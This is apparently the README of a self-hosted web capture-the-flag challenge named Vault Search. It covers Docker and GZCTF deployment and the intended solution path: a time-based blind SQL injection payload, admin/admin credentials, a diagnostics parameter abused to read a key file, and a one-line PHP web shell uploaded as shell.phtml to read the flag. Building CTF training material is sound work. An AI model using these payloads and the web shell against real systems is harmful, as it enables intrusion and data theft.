# Vault Search - hard Web CTF

仅用于本机或隔离 CTF 网络。启动后访问 `http://127.0.0.1:8088`。

## 题目给选手

你接手了一个遗留的 Vault Search 服务。管理员最近重启了系统，但内部构建工件服务仍然可用。目标：拿到 flag。

线索：服务包含搜索、员工登录、管理员诊断和构建工件上传功能。

## 启动方式

打开 PowerShell：

```powershell
cd D:\ctfweb
docker compose up --build -d
docker compose ps
```

看到 `ctfweb-db-1` 为 `healthy`，`ctfweb-web-1` 端口为 `127.0.0.1:8088->80/tcp` 即启动成功。

浏览器访问：

```text
http://127.0.0.1:8088
```

重置为全新环境：

```powershell
cd D:\ctfweb
docker compose down -v
docker compose up --build -d
```

flag 不写死在仓库中，而是在第一次有效上传后动态生成到容器内 `uploads/.vault_flag`，因此干净重置后会得到新的 flag。

## 一键验证

自动化解题脚本使用 Python `requests`：

```powershell
& "C:\Users\h'p\AppData\Local\Programs\Python\Python313\python.exe" D:\ctfweb\scripts\solve.py http://127.0.0.1:8088/
```

预期最后输出：

```text
[+] flag: CTF{vault_随机十六进制}
```

## 部署到 GZCTF

GZCTF 的容器题目需要填写一个可以独立启动的 Docker 镜像，不会替题目执行本项目的
`docker-compose.yml`，也不会自动创建本项目中的 MariaDB 服务。因此应使用 GitHub Actions
发布的单容器镜像，并在 GZCTF 中创建“动态容器”题目。

推荐镜像地址：

```text
ghcr.io/tosix336/ctf-web:latest
```

GZCTF 后台建议填写：

```text
题目类型：动态容器
容器镜像：ghcr.io/tosix336/ctf-web:latest
容器端口：80
网络模式：Open
```

动态容器的 flag 模板可以填写：

```text
CTF{vault_[TEAM_HASH]}
```

容器会读取 GZCTF 注入的 `GZCTF_FLAG`，并在首次上传 WebShell 时写入
`uploads/.vault_flag`。本地 Compose 没有 GZCTF flag 时，仍会生成随机 flag。

发布前请确认 GitHub Actions 已成功运行，并将 GHCR 容器包设置为 Public。若 GZCTF
所在服务器拉取镜像失败，先在服务器上测试：

```powershell
docker pull ghcr.io/tosix336/ctf-web:latest
docker run --rm -e GZCTF_FLAG=CTF{test_flag} -p 8088:80 ghcr.io/tosix336/ctf-web:latest
```

如果镜像拉取正常但 GZCTF 仍显示启动失败，查看 GZCTF 的容器日志；最常见原因是填写了
错误的镜像名、端口写成了 `8088`，或者镜像包仍是 Private。

## 解题思路

1. `/search.php?q=` 将输入拼接到 MariaDB `LIKE` 查询里，可做时间盲注。
2. 使用时间盲注从 `secrets` 表提取 `diag_key` 和 `upload_key`。
3. 使用弱口令 `admin/admin` 登录 `/login.php`。
4. 在后台诊断功能中提交 `diag_key`，并利用 `host` 参数读取 `/run/app/upload.key`。
5. 使用上传密钥上传 `.phtml` 文件，获得 PHP 代码执行。
6. 通过上传后的 WebShell 执行命令读取动态 flag。

正确的时间盲注 payload 需要在单引号前加一个普通字符：

```text
x' OR IF(ASCII(SUBSTRING((SELECT value FROM secrets WHERE name='diag_key'),1,1))=100,SLEEP(1),0)-- -
```

这个 `x` 很重要。否则原 SQL 中的 `LIKE '%'` 可能恒真，数据库会短路后面的 `IF(...SLEEP...)`，导致脚本误判所有字符。

## 手工解题入口

首页：

```text
http://127.0.0.1:8088/
```

登录页：

```text
http://127.0.0.1:8088/login.php
```

管理员账号和密码都是：

```text
admin
```

上传 WebShell 文件名：

```text
shell.phtml
```

文件内容：

```php
<?php system($_GET['c'] ?? 'id'); ?>
```

读取 flag：

```text
http://127.0.0.1:8088/uploads/shell.phtml?c=cat%20/var/www/html/uploads/.vault_flag
```
